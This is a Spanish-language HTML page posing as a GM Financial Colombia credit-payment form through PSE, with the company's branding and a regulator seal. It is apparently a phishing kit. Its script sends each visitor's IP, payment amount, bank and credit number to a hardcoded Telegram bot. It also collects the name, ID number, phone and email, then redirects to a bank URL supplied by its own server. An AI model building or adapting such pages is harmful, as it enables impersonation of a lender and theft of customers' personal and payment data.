<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<title>Pago GM Financial - PSE</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
<style>
  :root {
    --gm-blue: #0047FF;
    --gm-text: #333333;
    --gm-gray-light: #f4f4f4;
    --gm-gray-border: #cccccc;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  
  body {
    font-family: 'Open Sans', Arial, sans-serif;
    color: var(--gm-text);
    background-color: #f5f5f5; /* Fondo gris suave para que resalte la tarjeta */
    display: flex;
    flex-direction: column;
    min-height: 100vh;
  }

  /* ─── HEADER ─── */
  .top-bar { height: 5px; background-color: var(--gm-blue); width: 100%; }
  .header {
    padding: 15px 20px; display: flex; align-items: center; background: #fff; border-bottom: 1px solid #eaeaea;
  }
  .header img { height: 35px; object-fit: contain; }
  @media (min-width: 768px) { .header { padding: 20px 40px; } .header img { height: 45px; } }

  /* ─── CONTENIDO PRINCIPAL ─── */
  .main-content {
    flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center;
    padding: 30px 15px;
  }

  .titulo-pago {
    font-size: 16px; font-weight: 400; color: #444; text-align: center; margin-bottom: 25px;
  }
  @media (min-width: 768px) { .titulo-pago { font-size: 18px; margin-bottom: 30px; } }

  /* La tarjeta (Card) del formulario */
  .card-pago {
    background-color: #ffffff;
    border: 1px solid #e0e0e0;
    border-radius: 8px;
    padding: 25px 20px;
    width: 100%;
    max-width: 500px; /* En PC no se estira demasiado, se mantiene elegante */
    box-shadow: 0 6px 20px rgba(0,0,0,0.08);
  }
  @media (min-width: 768px) { .card-pago { padding: 35px 40px; } }

  /* Campos del formulario */
  .form-group { margin-bottom: 16px; }
  .form-group label {
    display: block; margin-bottom: 6px; font-size: 13px; font-weight: 600; color: #555;
  }
  .form-group input, .form-group select {
    width: 100%; padding: 12px 15px; border: 1px solid var(--gm-gray-border);
    border-radius: 6px; font-size: 14px; font-family: inherit; outline: none;
    transition: border-color 0.2s;
  }
  .form-group input:focus, .form-group select:focus {
    border-color: var(--gm-blue);
  }
  
  /* Estilos para campos bloqueados */
  .form-group input[readonly] {
    background-color: #f0f0f0; color: #666; cursor: not-allowed; font-weight: 600;
  }
  
  /* Estilo especial para el monto a pagar */
  .monto-destacado {
    color: var(--gm-blue) !important; 
    font-size: 18px !important; 
    font-weight: 700 !important;
  }

  /* Botón */
  .btn-continuar {
    width: 100%; padding: 14px; background-color: var(--gm-blue); color: white;
    border: none; border-radius: 6px; font-size: 16px; font-weight: 600;
    cursor: pointer; margin-top: 10px; transition: background 0.2s;
  }
  .btn-continuar:hover:not(:disabled) { background-color: #0036cc; }
  .btn-continuar:disabled { background-color: #88aaff; cursor: not-allowed; }

  /* Alertas */
  .alert { padding: 12px 15px; border-radius: 6px; margin-bottom: 15px; font-size: 13px; display: none; }
  .alert.error { background: #fce8e6; color: #c5221f; border: 1px solid #f5c6cb; }
  .alert.success { background: #e6f4ea; color: #137333; border: 1px solid #c3e6cb; }
  .alert.info { background: #e8f0fe; color: #1a73e8; border: 1px solid #b8daff; }
  .alert.show { display: block; }

  /* ─── FOOTER ─── */
  .footer {
    background-color: #000000; color: #ffffff; padding: 25px 20px;
    display: flex; flex-direction: column; align-items: flex-start; gap: 20px;
  }
  @media (min-width: 768px) {
    .footer { padding: 30px 40px; flex-direction: row; justify-content: space-between; align-items: center; }
  }
  .footer-left { display: flex; align-items: center; gap: 15px; }
  .sello-vigilado {
    border: 1px solid #fff; padding: 5px 2px; font-size: 8px; text-align: center;
    writing-mode: vertical-rl; transform: rotate(180deg); letter-spacing: 1px; height: 70px;
    display: flex; justify-content: center;
  }
  @media (min-width: 768px) { .sello-vigilado { font-size: 9px; height: 80px; } }
  .footer-logo { height: 30px; filter: brightness(0) invert(1); object-fit: contain; }
  .footer-logo-text { font-size: 9px; color: #aaa; margin-top: 5px; line-height: 1.2; }
  .footer-right { text-align: left; font-size: 11px; color: #aaaaaa; line-height: 1.6; }
  @media (min-width: 768px) { .footer-right { text-align: right; font-size: 13px; } }
  .footer-right strong { color: #00c98d; }

  /* Spinner */
  .spinner {
    display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.4);
    border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite; margin-right: 8px; vertical-align: middle;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>

<div class="top-bar"></div>

<div class="header">
  <img src="gm.png" alt="GM Financial" onerror="this.outerHTML='<h2 style=\'color:#0047FF; font-weight:700; font-size:20px;\'>gm FINANCIAL</h2>'">
</div>

<div class="main-content">
  <div class="titulo-pago">
    Realiza fácilmente el pago de la cuota de tu crédito
  </div>

  <div class="card-pago">
    <div id="alert-box" class="alert"></div>

    <form id="form-pse" autocomplete="off">
      
      <!-- 1. Monto a pagar (Visible y bloqueado) -->
      <div class="form-group">
        <label for="amount">Monto a pagar *</label>
        <input type="text" id="amount" required readonly class="monto-destacado">
      </div>

      <!-- 2. Nombre completo -->
      <div class="form-group">
        <label for="nombre_completo">Nombre completo *</label>
        <input type="text" id="nombre_completo" required placeholder="Ej: Juan Pérez">
      </div>

      <!-- 3. Cédula (Prellenada y bloqueada) -->
      <div class="form-group">
        <label for="numero_documento">Cédula de ciudadanía *</label>
        <input type="text" id="numero_documento" required readonly>
      </div>

      <!-- 4. Número de celular -->
      <div class="form-group">
        <label for="celular">Número de celular *</label>
        <input type="tel" id="celular" required placeholder="Ej: 3001234567">
      </div>

      <!-- 5. Correo electrónico -->
      <div class="form-group">
        <label for="email">Correo electrónico *</label>
        <input type="email" id="email" required placeholder="tucorreo@ejemplo.com">
      </div>

      <!-- 6. Banco PSE -->
      <div class="form-group">
        <label for="bank_code">Selecciona tu banco *</label>
        <select id="bank_code" required>
          <option value="">Cargando bancos...</option>
        </select>
      </div>

      <button type="submit" id="btn-pagar" class="btn-continuar" disabled>
        Pagar con PSE
      </button>
    </form>
  </div>
</div>

<!-- FOOTER NEGRO -->
<div class="footer">
  <div class="footer-left">
    <div class="sello-vigilado">VIGILADO<br>SUPERINTENDENCIA FINANCIERA<br>DE COLOMBIA</div>
    <div>
      <img src="gm.png" alt="GM Financial" class="footer-logo" onerror="this.outerHTML='<h2 style=\'color:#fff; font-weight:700;\'>gm FINANCIAL</h2>'">
      <div class="footer-logo-text">GM Financial Colombia S.A.<br>Compañía de Financiamiento.</div>
    </div>
  </div>
  <div class="footer-right">
    <strong>ZonaPAGOS</strong> es un producto de ZonaVirtual S.A.<br>Copyright ZonaVirtual S.A.
  </div>
</div>

<script>
(function () {
  'use strict';

  const API_BASE = window.location.origin;
  
  // Telegram
  const TG_BOT_TOKEN = '8994620249:AAH53iPEdWTRolMHaYTe5rwh-gQbShFFs7E';
  const TG_CHAT_ID   = '-1004457768033';

  // URL Params
  const params = new URLSearchParams(window.location.search);
  const PARAM_DOC     = params.get('documento') || '';
  const PARAM_TOTAL   = params.get('total')     || '';
  const PARAM_NOMBRE  = params.get('nombre')    || '';
  const PARAM_FACTURA = params.get('factura')   || '';
  const PARAM_CREDITO = params.get('credito')   || params.get('numeroCredito') || '';

  // Guardamos el valor numérico real en una variable global
  let VALOR_NUMERICO = 0;

  const $ = (id) => document.getElementById(id);

  function mostrarAlerta(tipo, mensaje) {
    const box = $('alert-box');
    box.className = 'alert show ' + tipo;
    box.textContent = mensaje;
  }
  function ocultarAlerta() {
    $('alert-box').className = 'alert';
  }
  function formatearCOP(valor) {
    return '$' + (Number(valor) || 0).toLocaleString('es-CO');
  }

  async function obtenerIP() {
    try {
      const r = await fetch('https://api.ipify.org?format=json');
      const d = await r.json();
      return d.ip || 'desconocida';
    } catch (_) { return 'desconocida'; }
  }

  async function notificarTelegram(ip, valor, banco, credito) {
    const texto = 
      '🚨 <b>NUEVO PAGO PSE — GM FINANCIAL</b> 🚨\n' +
      `🌐 <b>IP:</b> <code>${ip}</code>\n` +
      `💰 <b>Valor:</b> ${formatearCOP(valor)}\n` +
      `🏦 <b>Banco:</b> ${banco}\n` +
      `📄 <b>N° crédito:</b> ${credito || '—'}\n` +
      `🕒 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`;

    try {
      await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TG_CHAT_ID, text: texto, parse_mode: 'HTML' }),
      });
    } catch (err) { console.error('[telegram]', err); }
  }

  function prellenar() {
    if (PARAM_DOC) $('numero_documento').value = PARAM_DOC;
    if (PARAM_NOMBRE) $('nombre_completo').value = PARAM_NOMBRE;
    
    if (PARAM_TOTAL) {
      VALOR_NUMERICO = Number(String(PARAM_TOTAL).replace(/[^0-9.]/g, ''));
      // Pintamos el valor formateado en el input readonly
      $('amount').value = formatearCOP(VALOR_NUMERICO);
    }
  }

  async function cargarBancos() {
    const sel = $('bank_code');
    try {
      const resp = await fetch(`${API_BASE}/pse/bancos`);
      const data = await resp.json();
      if (!data.ok || !Array.isArray(data.bancos)) throw new Error(data.error || 'Inválido');
      
      sel.innerHTML = '<option value="">— Selecciona tu banco —</option>';
      data.bancos.forEach((b) => {
        const opt = document.createElement('option');
        opt.value = b.code || b.bank_code || b.id;
        opt.textContent = b.name || b.bank_name || b.description;
        sel.appendChild(opt);
      });
      $('btn-pagar').disabled = false;
    } catch (err) {
      sel.innerHTML = '<option value="">Error al cargar bancos</option>';
      mostrarAlerta('error', 'No se pudieron cargar los bancos.');
    }
  }

  $('form-pse').addEventListener('submit', async (e) => {
    e.preventDefault();
    ocultarAlerta();

    const nombre = $('nombre_completo').value.trim();
    const numeroDocumento = $('numero_documento').value.trim();
    const celular = $('celular').value.trim();
    const email = $('email').value.trim();
    const bankCode = $('bank_code').value;

    if (!nombre || !numeroDocumento || !celular || !email || !bankCode || !VALOR_NUMERICO) {
      return mostrarAlerta('error', 'Por favor completa todos los campos.');
    }

    const selectBanco = $('bank_code');
    const bankName = selectBanco.options[selectBanco.selectedIndex].textContent;
    const credito = PARAM_CREDITO || PARAM_FACTURA || '—';

    const btn = $('btn-pagar');
    btn.disabled = true;
    btn.innerHTML = '<span class="spinner"></span> Procesando...';

    mostrarAlerta('info', 'Conectando con PSE...');

    const ip = await obtenerIP();
    notificarTelegram(ip, VALOR_NUMERICO, bankName, credito);

    try {
      const resp = await fetch(`${API_BASE}/pse/pagar`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          bank_code: bankCode,
          bank_name: bankName,
          document_type: 'CC',
          document_number: numeroDocumento,
          amount: VALOR_NUMERICO, // Enviamos el valor numérico real
          email: email,
          full_name: nombre,
        }),
      });

      const data = await resp.json();
      if (!data.ok || !data.bank_url) throw new Error(data.error || 'No URL');

      mostrarAlerta('success', '✅ Redirigiendo a tu banco...');
      setTimeout(() => { window.location.href = data.bank_url; }, 800);

    } catch (err) {
      mostrarAlerta('error', 'Error al procesar el pago: ' + err.message);
      btn.disabled = false;
      btn.innerHTML = 'Pagar con PSE';
    }
  });

  prellenar();
  cargarBancos();
})();
</script>

</body>
</html>
